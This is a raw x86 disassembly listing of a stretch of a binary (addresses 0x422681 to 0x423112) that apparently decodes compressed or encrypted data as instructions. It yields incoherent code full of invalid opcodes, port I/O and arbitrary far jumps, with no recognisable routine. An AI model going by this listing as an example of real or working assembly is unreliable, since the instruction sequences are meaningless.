  422681:	mov    edi,0x290e4461
  422686:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422688:	mov    DWORD PTR [eax],esp
  42268a:	out    0x8d,al
  42268c:	sahf   
  42268d:	je     0x422708
  42268f:	inc    esi
  422690:	imul   ebp,DWORD PTR [ebx+0x35],0x6
  422694:	lock mov ch,cl
  422697:	mov    BYTE PTR [ecx],bl
  422699:	adc    eax,0xec8dfb31
  42269e:	pop    ss
  42269f:	aam    0x2b
  4226a1:	es (bad) 
  4226a3:	sbb    al,0x35
  4226a5:	dec    ecx
  4226a6:	adc    DWORD PTR [edi+0x74],esi
  4226a9:	mov    cl,0x22
  4226ab:	push   ebx
  4226ac:	mov    eax,edi
  4226ae:	scas   eax,DWORD PTR es:[edi]
  4226af:	ret    0x16a4
  4226b2:	fnstenv [edx]
  4226b4:	fdiv   DWORD PTR [ecx]
  4226b6:	jge    0x42272f
  4226b8:	mov    edx,0xe1676e13
  4226bd:	shr    DWORD PTR [ebx],0xda
  4226c0:	ror    BYTE PTR [ebp-0x24c83430],0xc2
  4226c7:	ror    BYTE PTR [edi-0xbed0315],0x5e
  4226ce:	pop    edx
  4226cf:	mov    eax,ds:0x1ce617dd
  4226d4:	jg     0x422740
  4226d6:	cmp    BYTE PTR [ebp-0x7c],al
  4226d9:	out    dx,eax
  4226da:	jnp    0x422677
  4226dc:	inc    edx
  4226dd:	mov    ecx,0x877042af
  4226e2:	stos   DWORD PTR es:[edi],eax
  4226e3:	daa    
  4226e4:	gs popf 
  4226e6:	xor    ecx,DWORD PTR [edx-0x74]
  4226e9:	push   esp
  4226ea:	cmp    ebx,DWORD PTR [edx-0x2e19f6d4]
  4226f0:	sbb    ebp,DWORD PTR [ebp-0x1bf84ba3]
  4226f6:	mov    esp,0xce88b42e
  4226fb:	gs loop 0x4226be
  4226fe:	adc    al,0xe1
  422700:	(bad)  
  422701:	xchg   ebp,eax
  422702:	out    0x7e,al
  422704:	les    eax,FWORD PTR [ebp+0xb]
  422707:	adc    al,0x7c
  422709:	stc    
  42270a:	shl    ah,cl
  42270c:	jns    0x422698
  42270e:	xchg   ebp,eax
  42270f:	push   ebx
  422710:	xor    eax,0x0
	...
  422771:	add    BYTE PTR [eax],al
  422773:	add    BYTE PTR [edi],ah
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0xb57f01c8
  422781:	lods   eax,DWORD PTR ds:[esi]
  422782:	repnz call 0x105:0x16fe3
  42278a:	add    BYTE PTR [eax],al
  42278c:	cmp    al,0xbd
  42278e:	cmp    eax,0xee1500de
  422793:	sub    cl,BYTE PTR [esi]
  422795:	cdq    
  422796:	(bad)  
  422797:	xchg   edx,eax
  422798:	div    BYTE PTR [ebx]
  42279a:	mov    cl,0x77
  42279c:	and    bh,BYTE PTR [esi-0x30]
  42279f:	mov    WORD PTR [edi],fs
  4227a1:	or     DWORD PTR [edx-0x49],ecx
  4227a4:	xchg   BYTE PTR [ebx-0x1a],dl
  4227a7:	ins    DWORD PTR es:[edi],dx
  4227a8:	jle    0x422745
  4227aa:	mov    al,ds:0xa971f573
  4227af:	dec    esp
  4227b0:	inc    ecx
  4227b1:	pop    es
  4227b2:	adc    edi,ecx
  4227b4:	lahf   
  4227b5:	imul   ebx,DWORD PTR [ebx+eax*8+0x7e],0xcc8d31f7
  4227bd:	dec    esp
  4227be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227bf:	sub    eax,0x389aa923
  4227c4:	aad    0xfc
  4227c6:	or     eax,0x907569e7
  4227cb:	lock rcl DWORD PTR [ebx-0x7f50155b],1
  4227d2:	es jb  0x422760
  4227d5:	pop    ebp
  4227d6:	jae    0x4227b7
  4227d8:	inc    eax
  4227d9:	lock xlat BYTE PTR ds:[ebx]
  4227db:	inc    ecx
  4227dc:	(bad)  
  4227dd:	lea    edx,[ebp-0x453ab369]
  4227e3:	adc    BYTE PTR [ecx+0x44c4368b],dl
  4227e9:	xchg   ebx,eax
  4227ea:	scas   al,BYTE PTR es:[edi]
  4227eb:	sub    esp,DWORD PTR [edi+ebx*2]
  4227ee:	xor    al,0x87
  4227f1:	test   BYTE PTR [edi],cl
  4227f3:	sbb    eax,0xae40c0bf
  4227f8:	out    0xbe,eax
  4227fa:	lahf   
  4227fb:	jmp    0xadf03e6a
  422800:	xor    BYTE PTR [ecx+0x76b5eced],0x4b
  422807:	inc    esp
  422808:	pop    ss
  422809:	das    
  42280a:	sti    
  42280b:	div    DWORD PTR [eax+0x14cda2de]
  422811:	jnp    0x42286c
  422813:	test   al,0x54
  422815:	dec    edi
  422816:	or     al,0xa5
  422818:	loop   0x42285a
  42281a:	pop    esi
  42281b:	and    edi,DWORD PTR [edx]
  42281d:	rdtsc  
  42281f:	mov    ?,WORD PTR [ecx+0x1a]
  422822:	push   cs
  422823:	mov    cl,0xf6
  422825:	inc    esp
  422826:	call   0x69a9:0x79ad54e
  42282d:	dec    ebx
  42282e:	(bad)  
  42282f:	fwait
  422830:	clc    
  422831:	and    DWORD PTR [esi-0x33da20d3],edx
  422837:	fist   DWORD PTR [eax]
  422839:	arpl   WORD PTR [eax-0x7396b8ee],si
  42283f:	mov    al,0xdb
  422841:	push   esi
  422842:	sbb    al,0xa3
  422844:	xchg   esp,eax
  422845:	rol    DWORD PTR ds:0x96524978,1
  42284b:	sbb    eax,0x5a24a57a
  422850:	(bad)
  422853:	mov    ebp,DWORD PTR [eax+0x533ee8d]
  422859:	mov    esi,eax
  42285b:	xor    eax,0x315a2bf4
  422860:	mov    bh,al
  422862:	or     al,0x72
  422864:	aas    
  422865:	in     al,dx
  422866:	int3   
  422867:	ror    BYTE PTR [ebx+0x1904fd80],0x24
  42286e:	jmp    0x6e12ca5c
  422873:	xor    DWORD PTR [edi-0x16497975],ebx
  422879:	inc    edi
  42287a:	out    dx,al
  42287b:	push   cs
  42287c:	xor    BYTE PTR [ebp-0x50],dh
  42287f:	ds push edx
  422881:	jl     0x61f530bb
  422887:	test   DWORD PTR [ebp+0x13],ecx
  42288a:	bswap  esi
  42288c:	inc    esp
  42288d:	inc    edi
  42288e:	pop    esi
  42288f:	sahf   
  422890:	jnp    0x422892
	...
  4228f2:	add    BYTE PTR [eax],al
  4228f4:	int    0x39
  4228f6:	mov    eax,0xef97fc97
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x422944
  422901:	dec    ebx
  422902:	ds test eax,ebp
  422905:	jo     0x422908
  422907:	add    BYTE PTR ds:0xa1000001,al
  42290d:	mov    ch,0xf
  42290f:	mov    WORD PTR ds:0xc2aae710,ss
  422915:	test   edi,0xfb330a97
  42291b:	sub    ebp,DWORD PTR [esi+edx*1+0x40]
  42291f:	out    0x6a,al
  422921:	cmp    BYTE PTR [esi+0xe231ac3],0x84
  422928:	repz inc ebx
  42292a:	and    al,0xce
  42292c:	imul   bl
  42292e:	fld    TBYTE PTR ds:0xf431cee0
  422934:	jp     0x422909
  422936:	mov    eax,ds:0x49610386
  42293b:	test   DWORD PTR [edx-0x4b],eax
  42293e:	pop    esp
  42293f:	inc    esp
  422940:	cmp    BYTE PTR [edi+0x52],al
  422943:	mov    BYTE PTR [esi-0x7a],bl
  422946:	dec    ebx
  422947:	jmp    0xeb67069f
  42294c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42294d:	xor    eax,0xaf3cf441
  422952:	xchg   al,dh
  422954:	and    BYTE PTR [esi+0x50],al
  422957:	and    al,0x2
  422959:	pop    ecx
  42295a:	push   edx
  42295b:	pop    edi
  42295c:	arpl   WORD PTR [ecx],si
  42295e:	push   ds
  42295f:	adc    ebx,0x95f00732
  422965:	mov    ds:0xd2a7bdd9,al
  42296a:	or     al,BYTE PTR [eax+0x2e3c006]
  422970:	sbb    ecx,DWORD PTR [ebp*4+0x56828a6c]
  422977:	loopne 0x42293e
  422979:	shl    esi,0x33
  42297c:	rol    BYTE PTR [edi],1
  42297e:	sub    ebp,DWORD PTR [ebp+0x76c2746f]
  422984:	iret   
  422985:	ja     0x422950
  422987:	or     al,0xd4
  422989:	outs   dx,BYTE PTR ds:[esi]
  42298a:	xor    DWORD PTR [esi+eiz*4-0x68],esi
  42298e:	jno    0x42293c
  422990:	mov    al,ds:0x19519def
  422995:	in     eax,dx
  422996:	push   ecx
  422997:	psubusw mm5,QWORD PTR [edx]
  42299a:	(bad)  [edi]
  42299c:	mov    bl,0xf6
  42299e:	stos   BYTE PTR es:[edi],al
  42299f:	push   esi
  4229a0:	inc    ebx
  4229a1:	pop    esi
  4229a2:	pusha  
  4229a3:	inc    esp
  4229a4:	retf   0xb1e8
  4229a7:	inc    ebp
  4229a8:	mov    ds:0xe9513f6b,eax
  4229ad:	fidiv  WORD PTR [ecx-0xd]
  4229b0:	push   esp
  4229b1:	sub    ah,bl
  4229b3:	pop    ecx
  4229b4:	mov    ebp,0xfdd66b3b
  4229b9:	imul   ebx,eax,0x80c0b8a5
  4229bf:	mov    bl,0xc4
  4229c1:	es inc ebx
  4229c3:	xor    DWORD PTR [ecx+0xb],ebx
  4229c6:	enter  0xda6d,0xe8
  4229ca:	(bad)  
  4229cb:	mov    eax,0xb85fb7da
  4229d0:	aad    0x15
  4229d2:	(bad)  
  4229d3:	ins    BYTE PTR es:[edi],dx
  4229d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229d6:	push   ebp
  4229d7:	cwde   
  4229d8:	call   0xb209272c
  4229dd:	mov    dh,0x68
  4229df:	dec    ebx
  4229e0:	loop   0x422a21
  4229e2:	fcom   st(4)
  4229e4:	adc    BYTE PTR [esi],ch
  4229e6:	in     eax,0x8a
  4229e8:	scas   eax,DWORD PTR es:[edi]
  4229e9:	in     eax,0xc0
  4229eb:	cmp    edi,DWORD PTR [esp+edi*4-0x636f5d3c]
  4229f2:	cdq    
  4229f3:	scas   eax,DWORD PTR es:[edi]
  4229f4:	outs   dx,BYTE PTR ds:[esi]
  4229f5:	xchg   edx,eax
  4229f6:	mov    ah,0xbc
  4229f8:	cmp    ch,BYTE PTR [ebp-0x36]
  4229fb:	sub    ebp,DWORD PTR [esi]
  4229fd:	mov    ebp,0xbbe94ae9
  422a02:	sbb    al,0x9e
  422a04:	xchg   edi,eax
  422a05:	fstp   DWORD PTR [ebx+0x6ead5eb1]
  422a0b:	add    eax,0x5d73ecf9
  422a10:	push   edx
	...
  422a71:	add    BYTE PTR [eax],al
  422a73:	add    BYTE PTR [esi-0x377e796],dl
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a81:	popa   
  422a82:	push   eax
  422a83:	adc    eax,0x171ed
  422a88:	add    eax,0x87000001
  422a8d:	dec    edi
  422a8e:	outs   dx,DWORD PTR ds:[esi]
  422a8f:	std    
  422a90:	ficomp WORD PTR [edx-0x36385c95]
  422a96:	xchg   ebp,eax
  422a97:	add    esp,DWORD PTR [esi+0x5]
  422a9a:	push   ss
  422a9b:	dec    eax
  422a9c:	mov    edx,0xd8d40aa0
  422aa1:	leave  
  422aa2:	jnp    0x422b23
  422aa4:	xor    cl,ch
  422aa6:	push   edi
  422aa7:	daa    
  422aa8:	bound  esi,QWORD PTR [edi+eax*2-0x496a4d68]
  422aaf:	mov    ebx,0x87345dec
  422ab4:	ja     0x422aed
  422ab6:	push   edx
  422ab7:	dec    esp
  422ab8:	jo     0x422af2
  422aba:	repz out 0xb4,al
  422abd:	lahf   
  422abe:	mov    dh,0x83
  422ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ac1:	jbe    0x422a44
  422ac3:	repz loope 0x422ac4
  422ac6:	push   ss
  422ac7:	scas   eax,DWORD PTR es:[edi]
  422ac8:	ret    
  422ac9:	mov    eax,ds:0xafafa15e
  422ace:	jmp    0x422adb
  422ad0:	add    al,0x42
  422ad2:	sub    eax,0x3259f3fa
  422ad7:	sub    BYTE PTR [ecx-0x41],al
  422ada:	cmp    DWORD PTR [ecx+0x78],edi
  422add:	pop    es
  422ade:	cmp    DWORD PTR [edi-0x65c6930d],edx
  422ae4:	xchg   edx,eax
  422ae5:	add    al,0xed
  422ae7:	hlt    
  422ae8:	adc    DWORD PTR [esi],esi
  422aea:	in     al,0x5d
  422aec:	int3   
  422aed:	xor    eax,0xa92ede00
  422af2:	fdiv   DWORD PTR [esi+0x51]
  422af5:	dec    ebp
  422af6:	jb     0x422b45
  422af8:	sub    eax,0xed5b3c29
  422afd:	ins    DWORD PTR es:[edi],dx
  422afe:	jmp    0x422ab2
  422b00:	dec    esp
  422b01:	inc    eax
  422b02:	pusha  
  422b03:	and    DWORD PTR [edi+0x73c9e48b],esp
  422b09:	pop    esp
  422b0a:	mov    bh,0x9c
  422b0c:	xor    eax,0xe0b6a092
  422b11:	or     ch,dh
  422b13:	inc    esp
  422b14:	sar    DWORD PTR [edx],0x34
  422b17:	lods   al,BYTE PTR ds:[esi]
  422b18:	in     al,0x2
  422b1a:	dec    esi
  422b1b:	add    bl,BYTE PTR [ebp+0x8bfcdf2]
  422b21:	and    DWORD PTR [ebp-0x46],eax
  422b24:	pop    ds
  422b25:	(bad)  
  422b26:	cli    
  422b27:	pop    ecx
  422b28:	sub    ch,ah
  422b2a:	es adc eax,0x696698
  422b30:	retf   0x8d5b
  422b33:	and    al,0x79
  422b35:	out    dx,eax
  422b36:	add    DWORD PTR [eax+0x27],edi
  422b39:	mov    dl,0xea
  422b3b:	xor    esp,DWORD PTR [esp-0x5b9738ce]
  422b42:	jbe    0x422b5b
  422b44:	pop    esi
  422b45:	add    dh,ah
  422b47:	call   FWORD PTR [ebx]
  422b49:	xchg   ebp,eax
  422b4a:	push   0xffffffe1
  422b4c:	dec    esi
  422b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b4e:	sub    BYTE PTR [ecx-0x45795e68],bl
  422b54:	out    0xc0,al
  422b56:	jb     0x422af7
  422b58:	mov    ebx,0xeddbd2cb
  422b5d:	mov    eax,eax
  422b5f:	jnp    0x422b69
  422b61:	shl    BYTE PTR [esi-0x6e632d8a],1
  422b67:	pop    ax
  422b69:	shr    BYTE PTR [eax-0x69bbe249],1
  422b6f:	pop    ds
  422b70:	lds    edx,FWORD PTR [edx+eax*1-0x19560e94]
  422b77:	and    ch,BYTE PTR [edx-0x3df369c9]
  422b7d:	ror    DWORD PTR [ebp+0x5f516b90],cl
  422b83:	mov    edx,edi
  422b85:	push   esi
  422b86:	cmp    BYTE PTR [ebx+0x98df3a8],ah
  422b8c:	mov    al,ds:0x2eba94c2
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x13c7b264]
  422c02:	adc    dl,cl
  422c04:	bnd jb 0x422c08
  422c07:	add    BYTE PTR ds:0x39000001,al
  422c0d:	xor    BYTE PTR [eax],ah
  422c0f:	stos   DWORD PTR es:[edi],eax
  422c10:	add    DWORD PTR [edx+0x4b],eax
  422c13:	pop    ss
  422c14:	dec    esp
  422c15:	mov    ss,esp
  422c17:	mov    esi,0xd477a1e5
  422c1c:	sbb    eax,0xdec7e29
  422c21:	push   es
  422c22:	sub    DWORD PTR [edi-0x49],esi
  422c25:	repz das 
  422c27:	fs test eax,0xd6656a5b
  422c2d:	loop   0x422bff
  422c2f:	outs   dx,BYTE PTR ds:[esi]
  422c30:	mov    dl,0x1a
  422c32:	or     DWORD PTR ds:0xad59ed7b,eax
  422c38:	sahf   
  422c39:	dec    edi
  422c3a:	loope  0x422c37
  422c3c:	rcr    ebp,cl
  422c3e:	dec    esp
  422c3f:	xchg   edx,eax
  422c40:	gs adc al,0x11
  422c43:	sub    BYTE PTR [ecx+0x37],bh
  422c46:	mov    ch,0x29
  422c48:	xor    BYTE PTR [esi-0x2470a07a],al
  422c4e:	pusha  
  422c4f:	mov    cl,BYTE PTR [ebx-0x46575ee8]
  422c55:	lods   eax,DWORD PTR ds:[esi]
  422c56:	or     DWORD PTR [ecx+eiz*8+0x584ce207],0x37
  422c5e:	mov    ds:0xf641d0a,al
  422c63:	cmc    
  422c64:	jg     0x422c71
  422c66:	psubq  mm4,QWORD PTR [edx+0xad9f8c3]
  422c6d:	push   cs
  422c6e:	retf   
  422c6f:	mov    ah,0x48
  422c71:	int3   
  422c72:	pop    ecx
  422c73:	or     DWORD PTR [eax+0x48ef3887],edx
  422c79:	loope  0x422cc0
  422c7b:	ins    BYTE PTR es:[edi],dx
  422c7c:	nop
  422c7d:	call   FWORD PTR [ecx+0x1ab83920]
  422c83:	mov    ebx,0x46aa7e4
  422c88:	stos   DWORD PTR es:[edi],eax
  422c89:	mov    esp,DWORD PTR [eax]
  422c8b:	stos   DWORD PTR es:[di],eax
  422c8d:	call   0x6e43:0x68eca45f
  422c94:	cs popa 
  422c96:	jbe    0x422c35
  422c98:	xlat   BYTE PTR ds:[ebx]
  422c9a:	xor    al,dl
  422c9c:	mov    ah,0xd6
  422c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c9f:	push   ecx
  422ca0:	pop    esi
  422ca1:	popa   
  422ca2:	f2xm1  
  422ca4:	ins    BYTE PTR es:[edi],dx
  422ca5:	mov    al,ds:0x5d6bfd46
  422caa:	sub    eax,0x7d5ed79c
  422caf:	inc    ecx
  422cb0:	leave  
  422cb1:	repz mov edx,0xe4814862
  422cb7:	stc    
  422cb8:	cld    
  422cb9:	adc    ch,al
  422cbb:	cmp    BYTE PTR [ecx],ch
  422cbd:	sub    al,0x66
  422cbf:	ss je  0x422c6e
  422cc2:	gs xchg edx,eax
  422cc4:	pop    ebx
  422cc5:	pop    edi
  422cc6:	mov    fs,WORD PTR [esi-0x57c76ab]
  422ccc:	or     ecx,DWORD PTR [ebx+0x2550a154]
  422cd2:	rcr    al,cl
  422cd4:	sar    BYTE PTR [eax+0x7f],cl
  422cd7:	or     ebx,DWORD PTR [eax]
  422cd9:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  422cdb:	mov    ecx,0x19863a6
  422ce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ce1:	add    eax,0x19130d30
  422ce6:	mov    al,ds:0x195f2219
  422ceb:	(bad)  
  422cec:	or     ch,ch
  422cee:	ja     0x422cfd
  422cf0:	cmc    
  422cf1:	mov    dl,0x3a
  422cf3:	fimul  DWORD PTR [ecx-0x15]
  422cf6:	push   0xffffff9f
  422cf8:	inc    edx
  422cf9:	idiv   BYTE PTR cs:[ebx+0x41]
  422cfd:	sub    BYTE PTR [edi],cl
  422cff:	or     dh,BYTE PTR [ebp-0x7a5a3bfe]
  422d05:	shr    esp,cl
  422d07:	xchg   esp,eax
  422d08:	jecxz  0x422cd5
  422d0a:	mov    bl,dh
  422d0c:	mov    ds:0x96f09f,al
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    ebp,esi
  422d81:	adc    eax,0x73f70b1c
  422d86:	add    DWORD PTR [eax],eax
  422d88:	add    eax,0x10000001
  422d8d:	(bad)  
  422d8e:	test   DWORD PTR [edi-0x1a],0x279cfae6
  422d95:	inc    esi
  422d96:	repnz adc al,0x5a
  422d99:	cmp    edi,DWORD PTR [eax-0x54]
  422d9c:	in     al,0x8b
  422d9e:	out    0x71,al
  422da0:	jge    0x422d53
  422da2:	xor    bh,bl
  422da4:	jno    0x422d4c
  422da6:	push   ds
  422da7:	arpl   WORD PTR [eax+0x34],sp
  422daa:	cmp    esp,DWORD PTR [eax+0x19]
  422dad:	mov    bh,0xa0
  422daf:	and    al,dl
  422db1:	js     0x422e1a
  422db3:	(bad)
  422db6:	and    ebp,ecx
  422db8:	jbe    0x422dde
  422dba:	inc    eax
  422dbb:	mov    eax,ds:0x4febe9b
  422dc0:	int    0x1a
  422dc2:	into   
  422dc3:	pop    ds
  422dc4:	or     al,0xb5
  422dc6:	or     dl,BYTE PTR [ebx+0x67]
  422dc9:	jge    0x422df5
  422dcb:	stc    
  422dcc:	add    eax,edx
  422dce:	dec    ebx
  422dcf:	fadd   st,st(2)
  422dd1:	test   DWORD PTR [edi],ecx
  422dd3:	in     eax,dx
  422dd4:	jno    0x422df0
  422dd6:	jecxz  0x422dd6
  422dd8:	jae    0x422dfb
  422dda:	out    dx,al
  422ddb:	fwait
  422ddc:	(bad)  
  422ddd:	dec    ebx
  422dde:	imul   eax,ecx,0xffffffc6
  422de1:	call   0xf68e1517
  422de6:	loope  0x422db8
  422de8:	jns    0x422de4
  422dea:	(bad)  
  422deb:	(bad)  [ebx+edi*2+0x2f]
  422def:	cmp    BYTE PTR [edx+eax*4],dl
  422df2:	fsub   QWORD PTR ds:0x9065ab8d
  422df8:	fstp   QWORD PTR [ebx+0x16]
  422dfb:	fisttp QWORD PTR [ebp+0x777a3cb]
  422e01:	push   esi
  422e02:	mov    eax,0x97333294
  422e07:	rcr    DWORD PTR [esi-0x3cb7f767],0x9c
  422e0e:	mov    ebp,0x1fda6b3c
  422e13:	aam    0x67
  422e15:	cmc    
  422e16:	std    
  422e17:	je     0x422de0
  422e19:	jmp    0x422e48
  422e1b:	fistp  QWORD PTR [edi-0xb414a82]
  422e21:	imul   BYTE PTR [esi]
  422e23:	or     ah,BYTE PTR [ecx+0x5f]
  422e26:	data16 into 
  422e28:	outs   dx,DWORD PTR cs:[esi]
  422e2a:	sbb    BYTE PTR [esi+ebp*4-0x5c],0x9c
  422e2f:	adc    bh,BYTE PTR [edx-0x22]
  422e32:	neg    DWORD PTR [ebp-0x7127bdfc]
  422e38:	dec    eax
  422e39:	test   DWORD PTR [ecx],edi
  422e3b:	jmp    0xb37a14eb
  422e40:	jmp    0x422e13
  422e42:	jp     0x422e09
  422e44:	inc    ecx
  422e45:	int    0xed
  422e47:	mov    bl,BYTE PTR [ebp-0x45168ab]
  422e4d:	pushf  
  422e4e:	cmp    DWORD PTR [ebx+0x64bf6d90],esi
  422e54:	pop    ecx
  422e55:	dec    esp
  422e56:	pop    edx
  422e57:	inc    edx
  422e58:	mov    es,WORD PTR [edi]
  422e5a:	cli    
  422e5b:	mov    bh,0x5b
  422e5d:	fs or  dl,cl
  422e60:	cmp    dh,BYTE PTR [edi+ecx*8+0x46]
  422e64:	cwde   
  422e65:	dec    ecx
  422e66:	cmp    al,0xb4
  422e68:	mul    DWORD PTR ds:0x602c91c5
  422e6e:	xor    DWORD PTR [eax+0x1b],esp
  422e71:	in     eax,0x19
  422e73:	or     bl,bh
  422e75:	jl     0x422ed5
  422e77:	aad    0x6f
  422e79:	inc    eax
  422e7a:	adc    ebx,0x680271e7
  422e80:	fadd   st(3),st
  422e82:	jp     0x422e1f
  422e84:	hlt    
  422e85:	inc    edx
  422e86:	pop    ds
  422e87:	test   eax,0x983dd2e
  422e8c:	pusha  
  422e8d:	sbb    bl,BYTE PTR ds:0x48f5
	...
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0x6707
  422f02:	push   ebp
  422f03:	inc    esp
  422f04:	cld    
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR ds:0xad000001,al
  422f0d:	mov    dl,0x16
  422f0f:	lsl    ebp,WORD PTR [edi-0x5c]
  422f13:	push   esp
  422f14:	repz shl bl,0x97
  422f18:	dec    eax
  422f19:	test   DWORD PTR [edx+0x8],esi
  422f1c:	mov    dh,0x51
  422f1e:	ror    DWORD PTR [esi+0x52],cl
  422f21:	mov    esi,esp
  422f23:	mov    dl,0xa1
  422f25:	or     DWORD PTR [edx+esi*1-0x2a],ecx
  422f29:	xor    al,0xb4
  422f2b:	popf   
  422f2c:	xchg   ebp,eax
  422f2d:	dec    ecx
  422f2e:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f30:	fsubr  st(3),st
  422f32:	inc    esp
  422f33:	mov    fs,WORD PTR [ebp+0xf89087a]
  422f39:	sub    ah,BYTE PTR [ecx+0x7fa2cc48]
  422f3f:	inc    esi
  422f40:	xchg   BYTE PTR [esi-0x4],bl
  422f43:	test   DWORD PTR [eax+eiz*2],esp
  422f46:	sub    al,BYTE PTR [edi+0x92769c]
  422f4c:	ss stos BYTE PTR es:[edi],al
  422f4e:	out    0x9f,eax
  422f50:	jle    0x422fb4
  422f52:	mov    dl,0x12
  422f54:	out    dx,eax
  422f55:	pop    es
  422f56:	mov    bh,0xfb
  422f58:	loop   0x422fc5
  422f5a:	std    
  422f5b:	loope  0x422f0b
  422f5d:	mov    ds:0x9c1bec40,al
  422f62:	loope  0x422f28
  422f64:	enter  0x18e2,0x67
  422f68:	(bad)  
  422f69:	push   ecx
  422f6a:	daa    
  422f6b:	loopne 0x422fdb
  422f6d:	scas   al,BYTE PTR es:[edi]
  422f6e:	addr16 (bad) 
  422f70:	sbb    eax,0x86d2b8ee
  422f75:	call   0x9fcff6db
  422f7a:	rol    DWORD PTR fs:[ebp+esi*8+0x58f2e306],1
  422f82:	js     0x422f6e
  422f84:	pop    esp
  422f85:	pushf  
  422f86:	loopne 0x422f0c
  422f88:	imul   esp,DWORD PTR [edi+ecx*2],0x1cdb4
  422f8f:	out    dx,al
  422f90:	or     BYTE PTR [esi+eiz*1],cl
  422f93:	std    
  422f94:	shl    DWORD PTR [esi-0x50a723b1],1
  422f9a:	imul   ebp,DWORD PTR [edi],0xffffffa1
  422f9d:	pop    esi
  422f9e:	adc    ebx,eax
  422fa0:	add    al,0xfa
  422fa2:	and    edx,edi
  422fa4:	out    0x73,al
  422fa6:	add    dh,bl
  422fa8:	mov    ds:0xe0039b0f,eax
  422fad:	adc    eax,0x96765e5c
  422fb2:	jbe    0x422f77
  422fb4:	div    eax
  422fb6:	inc    edx
  422fb7:	es pushf 
  422fb9:	mov    ss,WORD PTR [ecx]
  422fbb:	sub    edx,edi
  422fbd:	xor    eax,0x69d2a563
  422fc2:	dec    esi
  422fc3:	jne    0x422f7d
  422fc5:	or     al,0x9d
  422fc7:	dec    ecx
  422fc8:	xor    al,0xc
  422fca:	jg     0x42300a
  422fcc:	ins    DWORD PTR es:[edi],dx
  422fcd:	test   eax,0x41455c54
  422fd2:	sub    al,0xd1
  422fd4:	adc    al,0x90
  422fd6:	leave  
  422fd7:	xor    DWORD PTR [eax-0x6883f194],edi
  422fdd:	cs pushf 
  422fdf:	iret   
  422fe0:	push   eax
  422fe1:	je     0x422f7b
  422fe3:	test   al,0xe6
  422fe5:	pop    es
  422fe6:	mov    edi,es
  422fe8:	cmp    ecx,edx
  422fea:	fcomp  st(0)
  422fec:	cdq    
  422fed:	rol    BYTE PTR [ecx+0x7d],cl
  422ff0:	push   ss
  422ff1:	mov    esp,0xc86c0633
  422ff6:	pop    es
  422ff7:	sti    
  422ff8:	mul    BYTE PTR [eax-0x7e6f901e]
  422ffe:	out    0x88,eax
  423000:	dec    ebp
  423001:	(bad)  
  423002:	jae    0x422fe9
  423004:	cmc    
  423005:	add    ah,BYTE PTR [eax]
  423007:	sub    eax,0x3bc69b7e
  42300c:	mov    ah,ch
  42300e:	cmp    DWORD PTR [esi+0x36],edx
	...
  423074:	inc    esi
  423075:	in     al,0x62
  423077:	mov    dl,ah
  423079:	mov    gs,esi
  42307b:	out    dx,al
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [edi+esi*2+0x1fb0902],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0x9d000001,al
  42308d:	jns    0x42304a
  42308f:	xlat   BYTE PTR ds:[ebx]
  423090:	jg     0x4230f5
  423092:	push   eax
  423093:	stos   BYTE PTR es:[edi],al
  423094:	mov    ebp,0x614c8329
  423099:	aam    0x35
  42309b:	or     bh,ah
  42309d:	or     eax,0xb9edd85b
  4230a2:	imul   ecx,DWORD PTR [ebx-0x75],0x917710c
  4230a9:	cmp    al,0xeb
  4230ab:	mov    ds:0x3266b3a0,eax
  4230b0:	xchg   edx,eax
  4230b1:	mov    esi,0xf4376e48
  4230b6:	pop    es
  4230b7:	nop
  4230b8:	rol    DWORD PTR [esi+0x4c],0xe5
  4230bc:	xor    ebp,DWORD PTR [eax-0x46e23c0e]
  4230c2:	shr    eax,0xb8
  4230c5:	pop    ecx
  4230c6:	jno    0x4230b5
  4230c8:	(bad)  
  4230c9:	jmp    0x26fe:0xc4b573f4
  4230d0:	and    ebp,DWORD PTR [ebx-0x19a76fe3]
  4230d6:	shl    DWORD PTR [ecx],0xc7
  4230d9:	push   cs
  4230da:	ja     0x423066
  4230dc:	mov    al,ds:0x4d291bce
  4230e1:	xor    edi,DWORD PTR [ecx+0x53371e8c]
  4230e7:	clc    
  4230e8:	jl     0x4230c9
  4230ea:	shl    BYTE PTR [edx+0x3aaf0297],0x80
  4230f1:	lods   al,BYTE PTR ds:[esi]
  4230f2:	xchg   DWORD PTR [ecx-0x44],ecx
  4230f5:	mov    ds:0x732d3150,al
  4230fa:	out    dx,eax
  4230fb:	cmc    
  4230fc:	das    
  4230fd:	aaa    
  4230fe:	dec    esi
  4230ff:	out    dx,al
  423100:	mov    eax,ds:0xa3299fb4
  423105:	mov    ch,0xff
  423107:	sar    DWORD PTR [ebp+0x4c01b8b5],1
  42310d:	mov    bl,0x99
  42310f:	(bad)  
  423110:	adc    dh,BYTE PTR [edx]
  423112:	push   ebx
